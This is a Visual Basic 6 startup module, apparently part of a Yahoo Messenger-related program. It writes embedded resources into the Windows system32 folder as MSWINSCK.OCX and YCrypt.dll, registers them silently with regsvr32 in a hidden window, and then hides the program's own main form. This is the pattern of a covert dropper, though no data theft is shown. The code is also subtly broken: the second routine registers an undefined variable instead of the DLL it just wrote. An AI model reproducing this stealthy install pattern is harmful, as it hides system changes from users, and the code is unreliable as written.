Attribute VB_Name = "Module1"
'***************************************************************
'*************    CODE BY DINHQUANGTRUNG90@YAHOO.COM    ********
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
Function bFileExists(sFile As String) As Boolean
 On Error Resume Next
 bFileExists = ((GetAttr(sFile) And vbDirectory) = 0)
End Function

Sub Main()
Dim ocxDir As String
ocxDir = "C:\WINDOWS\system32\MSWINSCK.OCX"
If bFileExists(ocxDir) = False Then
Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
Shell "regsvr32 /s " & ocxDir, vbHide
End If
YMCOPY

frmMain.Show
frmMain.Visible = False
End Sub

Private Sub YMCOPY()
Dim ocDir As String
ocDir = "C:\WINDOWS\system32\YCrypt.dll"
If bFileExists(ocDir) = False Then
Dim bytResourceData() As Byte
bytResourceData = LoadResData(102, "CUSTOM")
Open ocDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
Shell "regsvr32 /s " & ocxDir, vbHide
End If
End Sub
